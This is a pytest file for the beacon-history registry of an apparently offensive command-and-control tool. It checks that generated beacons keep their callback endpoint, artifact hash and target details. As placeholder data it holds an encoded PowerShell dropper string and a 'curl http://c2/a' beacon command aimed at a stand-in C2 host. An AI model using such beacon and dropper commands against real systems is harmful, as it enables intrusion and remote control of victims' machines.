"""Endpoint provenance in payload history.

The generated one-liner used to be the only place the callback lived.  Once
it scrolled out of the terminal (or the operator came back weeks later), the
registry could not answer "which IP:port was this beacon built for?".
"""
import json

from phantom.utils import payload_manager


def _isolate_history(tmp_path, monkeypatch):
    path = tmp_path / "payload_history.json"
    monkeypatch.setattr(payload_manager, "_payload_history_path",
                        lambda: str(path))
    return path


def test_endpoint_provenance_round_trip(tmp_path, monkeypatch):
    _isolate_history(tmp_path, monkeypatch)

    entry = payload_manager.add_custom_beacon(
        "windows",
        "powershell -enc AAAA",
        "test dropper",
        source="pytest",
        connect={"host": "192.168.1.155", "port": 8443,
                 "scheme": "https", "url": "https://192.168.1.155:8443"},
        bind={"host": "0.0.0.0", "port": 8443,
              "scheme": "https", "url": "https://0.0.0.0:8443"},
        listener_alive=True,
        artifact_path=r"C:\build\beacon.pe",
        artifact_sha256="a" * 64,
        artifact_size=1234,
        token_fingerprint="deadbeefdeadbeef",
        profile="profiles/example.json",
        target="192.168.1.18",
    )

    assert entry["id"]
    assert entry["connect"]["url"] == "https://192.168.1.155:8443"
    assert entry["bind"]["host"] == "0.0.0.0"
    assert entry["listener_alive"] is True
    assert entry["artifact_sha256"] == "a" * 64
    assert entry["artifact_size"] == 1234
    assert entry["token_fingerprint"] == "deadbeefdeadbeef"
    assert entry["profile"] == "profiles/example.json"
    assert entry["target"] == "192.168.1.18"

    saved = payload_manager.get_custom_beacons()
    assert len(saved) == 1
    assert saved[0]["connect"] == entry["connect"]
    assert saved[0]["bind"] == entry["bind"]


def test_duplicate_keeps_id_and_refreshes_provenance(tmp_path, monkeypatch):
    _isolate_history(tmp_path, monkeypatch)

    first = payload_manager.add_custom_beacon(
        "linux", "curl http://c2/a", "test",
        connect={"host": "10.0.0.1", "port": 8443,
                 "scheme": "http", "url": "http://10.0.0.1:8443"},
    )
    second = payload_manager.add_custom_beacon(
        "linux", "curl http://c2/a", "test",
        connect={"host": "10.0.0.2", "port": 8443,
                 "scheme": "http", "url": "http://10.0.0.2:8443"},
    )

    assert second["id"] == first["id"]
    assert second["connect"]["host"] == "10.0.0.2"
    assert "last_generated_at" in second
    assert len(payload_manager.get_custom_beacons()) == 1


def test_legacy_entries_remain_readable(tmp_path, monkeypatch):
    path = _isolate_history(tmp_path, monkeypatch)
    path.write_text(json.dumps([{
        "id": "legacy-id",
        "platform": "windows",
        "command": "old command",
        "description": "before provenance",
        "source": "c2_shell",
        "created_at": "2025-01-01 00:00:00",
    }]), encoding="utf-8")

    saved = payload_manager.get_custom_beacons()
    assert len(saved) == 1
    assert saved[0]["id"] == "legacy-id"
    assert "connect" not in saved[0]


def test_c2_endpoint_rejects_unreachable_callback():
    from phantom.utils.network import C2Endpoint

    bad = C2Endpoint("0.0.0.0", 8443, True, True, 8443, True)
    warnings = bad.warnings()
    assert any("LISTEN address" in warning for warning in warnings)

    good = C2Endpoint("192.168.1.155", 8443, True, True, 8443, True)
    assert good.warnings() == []
    assert good.bind_port == 8443
